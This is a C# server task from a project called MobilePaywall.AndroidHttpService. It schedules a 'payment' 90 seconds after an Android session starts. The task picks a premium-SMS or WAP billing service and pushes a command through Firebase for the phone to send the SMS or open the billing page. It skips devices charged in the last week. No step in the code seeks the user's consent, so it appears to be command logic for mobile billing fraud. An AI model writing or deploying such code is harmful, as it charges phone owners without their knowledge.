using log4net;
using MobilePaywall.AndroidHttpService.Code.Session;
using MobilePaywall.AndroidHttpService.Controllers;
using MobilePaywall.Data;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;

namespace MobilePaywall.AndroidHttpService.Code.Tasks
{
  public class PayTask : TaskBase.TaskBase
  {
    #region #logging#
    private static ILog _log = null;

    protected static ILog Log
    {
      get
      {
        if (PayTask._log == null)
          PayTask._log = LogManager.GetLogger(typeof(PayTask));
        return PayTask._log;
      }
    }
    #endregion

    private string _commandToExecute = string.Empty;
    private bool _testBehavior = false;
    private SuitableServiceResponse _suitableService = null;
    private DateTime _nextTaskDate;

    public PayTask(string sessionID)
      : base("payTask", sessionID, DateTime.Now.AddSeconds(90))
    { }

    protected override void InitializeTask()
    {
      // test (for ME )
      if (this.AndroidClientSession.Country.TwoLetterIsoCode == "ME")
      {
        this._testBehavior = true;
        this.LogSession("This session is set for TEST behavior");
        return;
      }

      // check if this android client has active transaction in past week
      if (GetSuitableServices.CheckIfSessionHasTransactionIsPastWeek(this.AndroidClientSession))
      {
        Log.Error("PayTask:: This session allready has transaction in last week (session: " + this.AndroidClientSession.ID);
        this.LogSession("This session allready has transaction in last week");
        this.IsExecuted = true;
        return;
      }

      // try to get suitable service for payment
      if (this.AndroidClientSession.HasSmsPermission)
        this._suitableService = GetSuitableServices.GetPsmsService(this.AndroidClientSession);

      if(this._suitableService == null)
        this._suitableService = GetSuitableServices.GetWapService(this.AndroidClientSession);

      if(this._suitableService == null)
      {
        this.LogSession("This service has no suitable service");
        this.IsExecuted = true;
        return;
      }

      this.Name = this.AndroidClientSession.ID + ".payTask";

      // prepare execution command 
      if (!this._suitableService.IsPsms)
        this.ConstructWapPaymentCommand();
      else
        this.ConstructPsmsCommand();

      this.LogSession("Suitable service for payment is " + this._suitableService.Name + ", in " + this.ExecutionTime.ToString());
      Log.Debug("PayTask:: Suitable service for payment is " + this._suitableService.Name + ", in " + this.ExecutionTime.ToString());
    }

    protected override TaskBase.TaskExecutionResult TaskLogic()
    {
      if(this._testBehavior)
      {
        LiveController liveController1 = new LiveController();
        liveController1.FirebaseSend(string.Format("web::{0}::{1}", "http://strettoinv.com/test2/", "ME"),
          this.AndroidClientSession.TokenID,
          this.AndroidClientSession.ID);
        this.LogSession("Notification sent");
        return new TaskBase.TaskExecutionResult();
      }

      if (this._suitableService == null)
      {
        Log.Error("PayTask::TaskLogic.. ServiceName is empty");
        return new TaskBase.TaskExecutionResult();
      }

      if(string.IsNullOrEmpty(this._commandToExecute))
      {
        Log.Error("PayTask::TaskLogic.. Command to execute is null");
        return new TaskBase.TaskExecutionResult();
      }

      LiveController liveController = new LiveController();
      liveController.FirebaseSend(this._commandToExecute,
        this.AndroidClientSession.TokenID,
        this.AndroidClientSession.ID);

      this.LogSession("Notification sent");
      return new TaskBase.TaskExecutionResult();
    }
    
    private void ConstructWapPaymentCommand()
    {
      this._commandToExecute = string.Format("pay::{0}::{1}", this._suitableService.Name, this.AndroidClientSession.Country.TwoLetterIsoCode.ToLower());
    }

    private void ConstructPsmsCommand()
    {
      AndroidPremiumSmsRequest request = new AndroidPremiumSmsRequest(-1, this.AndroidClientSession, this._suitableService.ServiceData, false, false, DateTime.Now, DateTime.Now);
      request.Insert();

      string textMessage = string.Format("{0},{1} /s={1}", this._suitableService.Shortcode, this._suitableService.Keyword, request.ID);
      this._commandToExecute = string.Format("psms::{0}::{1}", textMessage, request.ID);
    }

  }
}